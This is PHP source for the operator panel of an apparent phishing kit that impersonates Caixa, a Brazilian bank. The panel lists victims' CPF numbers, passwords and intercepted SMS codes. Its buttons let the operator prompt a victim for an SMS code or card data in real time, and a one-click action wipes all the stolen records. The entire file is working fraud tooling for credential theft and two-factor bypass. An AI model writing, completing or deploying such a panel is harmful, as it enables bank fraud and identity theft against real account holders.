<?php
require_once "../config/database.php";
session_start();

if (!isset($_SESSION['operator_logged_in']) || $_SESSION['operator_logged_in'] !== true) {
    header("Location: operator_login.html");
    exit;
}

// Apagar todos os dados
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear_all'])) {
    $deleteSmsData = "DELETE FROM sms_data";
    $deleteUserData = "DELETE FROM user_data";

    if ($conn->query($deleteSmsData) === TRUE && $conn->query($deleteUserData) === TRUE) {
        echo json_encode(['success' => true]);
        exit;
    }
    echo json_encode(['success' => false]);
    exit;
}

// Atualizar status do usuário
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'], $_POST['user_id'])) {
    $userId = intval($_POST['user_id']);
    $action = $conn->real_escape_string($_POST['action']);

    $sql = "UPDATE user_data SET status = '$action' WHERE id = $userId";

    if ($conn->query($sql) === TRUE) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => $conn->error]);
    }
    exit;
}

// Consultar os usuários
$sql = "SELECT id, username, tipo, senha, sms_code, status, created_at FROM user_data ORDER BY created_at DESC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Painel do Operador</title>
  <link rel="stylesheet" href="assets/css/style.css">
  <script>
    async function submitAction(action, userId) {
        const formData = new FormData();
        formData.append('user_id', userId);
        formData.append('action', action);

        try {
            const response = await fetch('operator_view.php', {
                method: 'POST',
                body: formData,
            });
            const result = await response.json();

            console.log(result); // Log para depuração
            if (result.success) {
                alert('Ação realizada com sucesso!');
            } else {
                alert('Erro ao executar a ação: ' + (result.error || 'desconhecido'));
            }
        } catch (error) {
            console.error('Erro na solicitação:', error);
            alert('Erro ao conectar com o servidor.');
        }
    }
  </script>
</head>
<body>
<header class="header">
  <img src="assets/images/logocxc-removebg-preview.png" alt="Logo Caixa" class="logo">
  <form method="POST" action="../src/logout_operator.php" style="float: right; margin: 10px;">
    <button type="submit" class="logout-button">Sair</button>
  </form>
</header>
<section class="main-section">
  <div class="operator-container">
    <table border="1" class="data-table">
      <thead>
        <tr>
          <th>ID</th>
          <th>CPF</th>
          <th>Tipo</th>
          <th>Senha</th>
          <th>SMS Code</th>
          <th>Status</th>
          <th>Ações</th>
          <th>Data de Cadastro</th>
        </tr>
      </thead>
      <tbody>
    <?php
    if ($result && $result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $id = $row['id'];
            echo "<tr>
                    <td>{$row['id']}</td>
                    <td>{$row['username']}</td>
                    <td>{$row['tipo']}</td>
                    <td>{$row['senha']}</td>
                    <td>{$row['sms_code']}</td>
                    <td>{$row['status']}</td>
                    <td>
                        <button type='button' onclick='submitAction(\"aguardando_sms\", {$id})'>Pedir SMS</button>
                        <button type='button' onclick='submitAction(\"request_card_data\", {$id})'>Pedir Dados do Cartão</button>
                    </td>
                    <td>{$row['created_at']}</td>
                  </tr>";
        }
    } else {
        echo "<tr><td colspan='8'>Nenhum dado encontrado.</td></tr>";
    }
    ?>
</tbody>
    </table>
  </div>
</section>
<footer>
  <p>Bons trampos!</p>
</footer>
</body>
</html>
<?php $conn->close(); ?>
